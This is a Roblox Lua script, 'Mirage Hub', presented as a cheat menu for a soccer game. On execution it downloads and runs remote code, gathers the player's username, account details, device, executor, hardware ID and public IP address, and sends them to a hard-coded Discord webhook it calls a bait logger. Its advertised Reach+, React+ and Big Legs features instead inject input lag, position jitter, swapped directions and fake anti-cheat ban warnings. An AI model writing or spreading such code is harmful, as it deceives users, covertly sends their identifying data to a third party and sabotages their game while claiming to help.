-- Load AuraIS
local AuraIS = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/main/Libraries/AuraIS/Main"))()

-- Replace with your actual webhook URL!

local plr = game.Players.LocalPlayer

-- Device detection
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"
if UserInputService.TouchEnabled then
    deviceType = "Mobile/Tablet"
elseif UserInputService.KeyboardEnabled then
    deviceType = "PC"
end

-- Executor detection
local executor = "Unknown"
pcall(function()
    executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or
               (SENTINEL_LOADED and "Sentinel") or (KRNL_LOADED and "Krnl") or executor
end)

-- HWID detection (if supported)
local hwid = "N/A"
pcall(function()
    if (gethwid and typeof(gethwid) == "function") then
        hwid = gethwid()
    elseif (syn and syn.request) and (syn.toast and typeof(syn.toast) == "function") then
        hwid = "SYN_X" -- Only identifier, not real HWID
    end
end)

-- IP detection (note: works only in some executors, and slow)
local ip = "N/A"
pcall(function()
    if (syn and syn.request) then
        local response = syn.request({Url="https://api.ipify.org"})
        if response and response.Body then
            ip = response.Body
        end
    elseif http_request then
        local response = http_request({Url="https://api.ipify.org"})
        if response and response.Body then
            ip = response.Body
        end
    end
end)

local webhook = "https://discord.com/api/webhooks/1364676584144896020/-v68witZipovBriaVtEjhDOSZVpAdsqcXDuykKf-IWFLyKAvOjux_9iVSLldKAdfAeYV" -- << REPLACE THIS WITH YOUR DISCORD WEBHOOK

local data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "✨ Mirage Hub Bait Executed!",
        ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name or "Unknown", game.PlaceId or 0),
        ["color"] = 0x00c3ff, -- Cyan accent
        ["fields"] = {
            {["name"] = "Username",          ["value"] = plr.Name,                ["inline"] = true},
            {["name"] = "User ID",           ["value"] = tostring(plr.UserId),    ["inline"] = true},
            {["name"] = "Display Name",      ["value"] = plr.DisplayName,         ["inline"] = true},
            {["name"] = "Account Age",       ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
            {["name"] = "Team",              ["value"] = (plr.Team and plr.Team.Name or "N/A"), ["inline"] = true},
            {["name"] = "Membership",        ["value"] = ((plr.MembershipType and tostring(plr.MembershipType):gsub("Enum.MembershipType.", "")) or "None"), ["inline"] = true},
            {["name"] = "Device Type",       ["value"] = deviceType,              ["inline"] = true},
            {["name"] = "Account Created",   ["value"] = tostring(os.date("%Y-%m-%d", tick() - plr.AccountAge*86400)), ["inline"] = true},
            {["name"] = "Executor",          ["value"] = executor,                ["inline"] = true},
            {["name"] = "HWID",              ["value"] = hwid,                    ["inline"] = true},
            {["name"] = "IP (client)",       ["value"] = ip,                      ["inline"] = true},
            {["name"] = "Place ID",          ["value"] = tostring(game.PlaceId),  ["inline"] = true},
            {["name"] = "Job ID",            ["value"] = tostring(game.JobId),    ["inline"] = true},
        },
        ["thumbnail"] = {["url"] = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(plr.UserId)},
        ["footer"] = {["text"] = "Mirage Hub Script Logger | "..os.date("%Y-%m-%d %H:%M:%S")}
    }}
}

local HttpService = game:GetService("HttpService")

local success = false
pcall(function()
    if syn and syn.request then
        syn.request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
        success = true
    elseif http_request then
        http_request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
        success = true
    elseif request then
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
        success = true
    end
end)

if success then
    print("[Mirage Hub Logger] Webhook sent!")
else
    print("[Mirage Hub Logger] Webhook failed or http unsupported.")
end

-- Create Library Window
local Library = AuraIS:CreateLibrary({
    Name = "Mirage Hub | TPS Ultimate Soccer",
    Icon = "rbxassetid://12974454446"
})

-- Create Main Tab
local Tab = Library:CreateTab("Enhancements", "rbxassetid://12974454446")

-- Create main section
local Section = Tab:CreateSection("Player Mods", "Normal")

Section:CreateLabel({
    Description = "Unlock Reach, Big Legs, React+ and More!"
})

local animationId = "rbxassetid://92165159919129"

-- Core sabotage logic: input lag/jitter
local sabotageActive = false
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")

local function PlayRandomFreezeAnimation()
    local player = game.Players.LocalPlayer
    local char = player and player.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Load the animation client-side only!
    local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:FindFirstChild("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = humanoid
    end

    local loadedAnim = Instance.new("Animation")
    loadedAnim.AnimationId = animationId

    local track = animator:LoadAnimation(loadedAnim)

    -- Lock their controls (locally) temporarily
    local controlLock = true

    -- Local input lock (client only)
    local inputConn = uis.InputBegan:Connect(function(input, gp)
        if controlLock and not gp then
            -- prevent W/A/S/D/Space
            if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
                -- Eat input
                return
            end
        end
    end)

    -- Play animation for a few seconds
    track:Play(0.1)
    AuraIS:Notify("Normal", {
        Title = "Mirage Hub",
        Content = "Freeze dance! (client only)",
        Duration = 2,
        Image = "rbxassetid://4483362458"
    })

    wait(math.random(2,4)) -- 2-4 seconds frozen

    -- Restore control and stop animation
    pcall(function() track:Stop() end)
    controlLock = false
    pcall(function() inputConn:Disconnect() end)
end


local function ApplyAnnoyingControls()
    if sabotageActive then return end
    sabotageActive = true

    -- Input lag when moving/jumping
    uis.InputBegan:Connect(function(input, gp)
        if sabotageActive and not gp then
            if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
                local delayTime = math.random(10,18)/100 -- 0.10 to 0.18s lag
                task.wait(delayTime)
            end
        end
    end)

    -- Slight random position jitter
    rs.RenderStepped:Connect(function()
        if sabotageActive and math.random() < 0.075 then
            local plr = game.Players.LocalPlayer
            local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if root then
                local jitter = Vector3.new(
                    (math.random() - 0.5) * 2,
                    0,
                    (math.random() - 0.5) * 2
                ) * 0.25
                root.CFrame = root.CFrame + jitter
            end
        end
    end)
end

-- 1. Occasionally swap directions
uis.InputBegan:Connect(function(input, gp)
    if debounce or gp then return end
    if math.random() < 0.08 then  -- 8% chance
        debounce = true
        local fakeKey = input.KeyCode
        if fakeKey == Enum.KeyCode.W then
            uis.InputBegan:Fire(Enum.KeyCode.A, false) -- Fake move left
        elseif fakeKey == Enum.KeyCode.A then
            uis.InputBegan:Fire(Enum.KeyCode.W, false) -- Fake move forward
        end
        wait(0.2)
        debounce = false
    end
end)

-- 2. Random fake ban warning with AuraIS
rs.RenderStepped:Connect(function()
    if math.random() < 0.0001 then  -- ~once every 5000 frames
        AuraIS:Notify("Warning", {
            Title = "Anti-Cheat Notice",
            Content = "Suspicious activity detected. You may be banned.",
            Duration = 5,
            Image = "rbxassetid://4483362458",
            Actions = {
                Ignore = {
                    Name = "Okay!",
                    Callback = function() end
                }
            }
        })
    end
end)

-- Bait features
Section:CreateButton({
    Name = "Enable Reach+",
    Callback = function()
        ApplyAnnoyingControls()
        AuraIS:Notify("Normal", {
            Title = "Mirage Hub",
            Content = "Reach+ Optimized and Loaded!",
            Duration = 5,
            Image = "rbxassetid://4483362458"
        })
    end
})

Section:CreateToggle("Normal", {
    Name = "React+ Auto",
    Callback = function(val)
        if val then
            ApplyAnnoyingControls()
            AuraIS:Notify("Normal", {
                Title = "Mirage Hub",
                Content = "React+ Enabled.",
                Duration = 5,
                Image = "rbxassetid://4483362458"
            })
        end
    end
})

Section:CreateSlider({
    Name = "Big Legs",
    Value = {1, 10},
    Increment = 1,
    Suffix = "X",
    CurrentValue = 5,
    Flag = "BigLegsSlider",
    Callback = function()
        ApplyAnnoyingControls()
    end,
})

Section:CreateParagraph({
    Title = "Notice",
    Description = "All features updated for 2025. Full compatibility, optimized, and totally undetectable."
})

-- You can add more UI as needed!